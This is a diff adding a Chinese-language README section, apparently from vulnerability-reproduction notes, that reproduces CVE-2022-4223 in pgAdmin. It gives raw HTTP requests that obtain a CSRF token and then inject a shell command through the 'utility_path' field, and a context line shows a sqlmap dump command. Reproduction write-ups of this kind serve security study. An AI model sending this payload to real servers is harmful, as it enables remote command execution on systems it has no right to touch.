@@ -1247,3 +1247,50 @@ sqlmap -r Desktop/flag.txt --technique B -D employee_akpoly -T flag -C flag --du
 ```
 
 ![image-20240413125347827](./img/README/image-20240413125347827.png)
+
+
+### CVE-2022-4223
+
+> 
+
+在复现漏洞前，需要发送如下数据包获取CSRF token：
+
+```
+GET /login HTTP/1.1
+Host: {{Hostname}}
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
+Connection: close
+```
+
+
+
+在返回包中拿到一个新的session id和csrf token：
+
+![1](./img/README/1.png)
+
+然后，将获取到的`session_id`和`csrf_token`填写进下面的数据包并发送：
+
+```
+POST /misc/validate_binary_path HTTP/1.1
+Host: {{Hostname}}
+Content-Length: 27
+X-pgA-CSRFToken: {{csrf-token}}
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+Content-Type: application/json
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
+Cookie: pga4_session={{session-id}}
+Connection: close
+
+{"utility_path":"a\";id;#"}
+```
+
+
+
+可见，`id`命令已经被成功执行：
+
+![2](./img/README/2.png)
